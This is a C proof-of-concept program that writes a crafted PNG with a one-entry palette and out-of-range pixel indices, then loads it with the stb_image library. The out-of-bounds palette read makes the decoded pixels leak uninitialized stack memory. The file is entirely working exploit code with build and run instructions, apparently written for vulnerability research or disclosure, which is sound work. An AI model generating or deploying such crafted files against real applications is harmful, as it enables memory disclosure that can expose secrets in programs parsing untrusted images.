// PoC: H3 -- PNG palette index OOB (uninitialized stack memory leak)
//
// Generates a minimal paletted PNG with a 1-entry palette but pixel
// data containing values 0-255. stb_image reads uninitialized stack
// bytes into the output for all indices >= 1.
//
// Build: gcc -o poc_palette_leak poc_palette_leak.c
// Run:   ./poc_palette_leak
//        It writes "palette_leak.png" then loads it with stb_image.
//        Output pixels beyond index 0 contain stack garbage.

#define STB_IMAGE_IMPLEMENTATION
#include "../stb/stb_image.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// ---- minimal zlib/deflate (store only, no compression) ----

static uint32_t crc_table[256];
static int crc_table_ready = 0;

static void make_crc_table(void) {
    for (int n = 0; n < 256; n++) {
        uint32_t c = (uint32_t)n;
        for (int k = 0; k < 8; k++) {
            if (c & 1) c = 0xedb88320u ^ (c >> 1);
            else c = c >> 1;
        }
        crc_table[n] = c;
    }
    crc_table_ready = 1;
}

static uint32_t update_crc(uint32_t crc, const uint8_t *buf, int len) {
    if (!crc_table_ready) make_crc_table();
    uint32_t c = crc;
    for (int n = 0; n < len; n++)
        c = crc_table[(c ^ buf[n]) & 0xff] ^ (c >> 8);
    return c;
}

static uint32_t png_crc(const uint8_t *buf, int len) {
    return update_crc(0xffffffffu, buf, len) ^ 0xffffffffu;
}

static uint32_t adler32(const uint8_t *data, int len) {
    uint32_t a = 1, b = 0;
    for (int i = 0; i < len; i++) {
        a = (a + data[i]) % 65521;
        b = (b + a) % 65521;
    }
    return (b << 16) | a;
}

static void put32be(uint8_t *p, uint32_t v) {
    p[0] = (v >> 24) & 0xff;
    p[1] = (v >> 16) & 0xff;
    p[2] = (v >> 8) & 0xff;
    p[3] = v & 0xff;
}

static void put16le(uint8_t *p, uint16_t v) {
    p[0] = v & 0xff;
    p[1] = (v >> 8) & 0xff;
}

static void write_chunk(FILE *f, const char *type, const uint8_t *data, int len) {
    uint8_t hdr[4];
    put32be(hdr, len);
    fwrite(hdr, 1, 4, f);
    fwrite(type, 1, 4, f);
    if (len > 0) fwrite(data, 1, len, f);
    // CRC over type + data
    uint8_t *buf = malloc(4 + len);
    memcpy(buf, type, 4);
    if (len > 0) memcpy(buf + 4, data, len);
    uint32_t crc = png_crc(buf, 4 + len);
    free(buf);
    put32be(hdr, crc);
    fwrite(hdr, 1, 4, f);
}

int main(void) {
    const int W = 16, H = 16;
    const char *filename = "palette_leak.png";

    FILE *f = fopen(filename, "wb");
    if (!f) { perror("fopen"); return 1; }

    // PNG signature
    uint8_t sig[] = {137, 80, 78, 71, 13, 10, 26, 10};
    fwrite(sig, 1, 8, f);

    // IHDR: 16x16, 8-bit palette (color type 3)
    uint8_t ihdr[13];
    put32be(ihdr + 0, W);
    put32be(ihdr + 4, H);
    ihdr[8] = 8;   // bit depth
    ihdr[9] = 3;   // color type: indexed
    ihdr[10] = 0;  // compression
    ihdr[11] = 0;  // filter
    ihdr[12] = 0;  // interlace
    write_chunk(f, "IHDR", ihdr, 13);

    // PLTE: only 1 entry (red)
    uint8_t plte[] = {0xff, 0x00, 0x00};
    write_chunk(f, "PLTE", plte, 3);

    // IDAT: pixel data with indices 0..255
    // Each row: filter byte (0) + W bytes of pixel indices
    int raw_len = H * (1 + W);
    uint8_t *raw = calloc(1, raw_len);
    for (int y = 0; y < H; y++) {
        raw[y * (1 + W)] = 0; // no filter
        for (int x = 0; x < W; x++) {
            // use pixel values that go well beyond palette size (1)
            raw[y * (1 + W) + 1 + x] = (uint8_t)((y * W + x) % 256);
        }
    }

    // wrap in zlib stored block
    int zlib_len = 2 + 5 + raw_len + 4; // header + block header + data + adler32
    uint8_t *zlib = malloc(zlib_len);
    zlib[0] = 0x78; // CMF
    zlib[1] = 0x01; // FLG
    // stored block: BFINAL=1, BTYPE=00
    zlib[2] = 0x01;
    put16le(zlib + 3, (uint16_t)raw_len);
    put16le(zlib + 5, (uint16_t)(~raw_len));
    memcpy(zlib + 7, raw, raw_len);
    uint32_t adl = adler32(raw, raw_len);
    put32be(zlib + 7 + raw_len, adl);

    write_chunk(f, "IDAT", zlib, zlib_len);
    write_chunk(f, "IEND", NULL, 0);

    fclose(f);
    free(raw);
    free(zlib);

    printf("wrote %s (%dx%d paletted PNG, 1 palette entry, pixel values 0-255)\n", filename, W, H);
    printf("loading with stb_image...\n");

    // load with stb_image

    int w, h, ch;
    uint8_t *img = stbi_load(filename, &w, &h, &ch, 3);
    if (!img) {
        printf("stbi_load failed: %s\n", stbi_failure_reason());
        return 1;
    }

    printf("loaded %dx%d, %d channels\n", w, h, ch);

    // pixel 0 should be red (from the palette). all others read from
    // uninitialized stack memory in the palette[] array.
    printf("\npixel[0] (palette entry 0, should be red): R=%d G=%d B=%d\n",
           img[0], img[1], img[2]);

    int leaked = 0;
    for (int i = 1; i < w * h; i++) {
        int r = img[i*3+0], g = img[i*3+1], b = img[i*3+2];
        // if it's not black (zeroed) and not red (palette[0]), it's stack leak
        if (r != 0xff || g != 0x00 || b != 0x00) {
            if (r != 0 || g != 0 || b != 0) {
                leaked++;
            }
        }
    }

    printf("pixels with non-zero, non-red values (stack leak): %d / %d\n",
           leaked, w * h - 1);

    if (leaked > 0) {
        printf("\nfirst 8 leaked pixel values:\n");
        int shown = 0;
        for (int i = 1; i < w * h && shown < 8; i++) {
            int r = img[i*3+0], g = img[i*3+1], b = img[i*3+2];
            if ((r != 0xff || g != 0x00 || b != 0x00) && (r || g || b)) {
                printf("  pixel[%d] (index %d): R=%d G=%d B=%d\n",
                       i, i % 256, r, g, b);
                shown++;
            }
        }
    }

    stbi_image_free(img);
    return 0;
}
